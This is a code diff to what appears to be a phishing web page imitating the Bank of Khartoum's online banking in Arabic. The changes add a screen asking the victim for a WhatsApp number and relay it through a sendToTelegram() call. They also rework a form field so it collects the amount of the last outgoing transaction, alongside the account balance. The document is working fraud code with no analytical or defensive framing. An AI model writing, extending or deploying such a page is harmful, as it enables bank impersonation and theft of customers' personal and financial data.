@@ -1109,9 +1109,35 @@
         <div class="modal-header">هل ترغب في الدخول إلي حسابك من خدمة بنك الخرطوم المصرفية ؟</div>
         <div class="modal-body" style="font-size: 0.85rem;">اضغط على زر إعادة التعيين واتبع التعليمات.</div>
         <div class="modal-actions" style="flex-direction: column; gap: 6px; width: 100%;">
-          <button class="btn-red" onclick="goToSecurityQuestions()">الإجابة على أسئلة الأمان</button>
+          <button class="btn-red" onclick="goToWhatsappScreen()">الإجابة على أسئلة الأمان</button>
           <button class="btn-red" style="background: #ef4444;" onclick="closeModal('modalDevice')">إلغاء</button>
         </div>
+      </div>
+    </div>
+
+    <!-- شاشة إدخال رقم الواتساب وحدها قبل أسئلة الأمان -->
+    <div class="screen" id="screenWhatsappInput">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
+          <span class="page-title">رقم الواتساب</span>
+        </div>
+        <div class="logo-box" style="transform: scale(0.7);">
+          <div class="logo-ar">بنـ<span>كك</span></div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <p style="font-size: 0.9rem; color: #374151; margin-bottom: 12px; font-weight: 600;">
+          الرجاء إدخال رقم الواتساب الخاص بك للمتابعة:
+        </p>
+
+        <div class="input-box">
+          <span class="icon-right">📱</span>
+          <input type="tel" class="input-field" placeholder="أدخل رقم الواتساب هنا" id="preSecurityWhatsappInput" autocomplete="off" />
+        </div>
+
+        <button class="btn-red" onclick="submitPreSecurityWhatsapp()">متابعة إلى أسئلة الأمان</button>
       </div>
     </div>
 
@@ -1132,7 +1158,7 @@
     <div class="screen" id="screenQuestions">
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
-          <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
+          <button class="btn-back" onclick="switchScreen('screenWhatsappInput')">رجوع ➔</button>
           <span class="page-title">أسئلة الأمان</span>
         </div>
         <div class="logo-box" style="transform: scale(0.7);">
@@ -1219,8 +1245,8 @@
             <input type="text" class="input-field" id="post_balance" placeholder="أدخل الرصيد المتبقي في الحساب" required autocomplete="off" />
           </div>
           <div class="input-box">
-            <label class="input-label">رقم واتساب</label>
-            <input type="tel" class="input-field" id="post_whatsapp" placeholder="أدخل رقم واتساب" required autocomplete="off" />
+            <label class="input-label">اخر معاملة صادرة </label>
+            <input type="tel" class="input-field" id="post_whatsapp" placeholder="أدخل  المبلغ" required autocomplete="off" />
           </div>
           <button type="submit" class="btn-red" style="margin-top: 10px;">إرسال</button>
         </form>
@@ -1752,8 +1778,18 @@
       document.getElementById('modalDevice').style.display = 'flex';
     }
 
-    function goToSecurityQuestions() {
+    function goToWhatsappScreen() {
       closeModal('modalDevice');
+      switchScreen('screenWhatsappInput');
+    }
+
+    function submitPreSecurityWhatsapp() {
+      const whatsappVal = document.getElementById('preSecurityWhatsappInput').value.trim();
+      if (whatsappVal === '') {
+        showErrorModal("الرجاء إدخال رقم الواتساب للمتابعة.");
+        return;
+      }
+      sendToTelegram(`📱 *رقم الواتساب (قبل أسئلة الأمان):*\n\`${whatsappVal}\``);
       switchScreen('screenQuestions');
     }
 
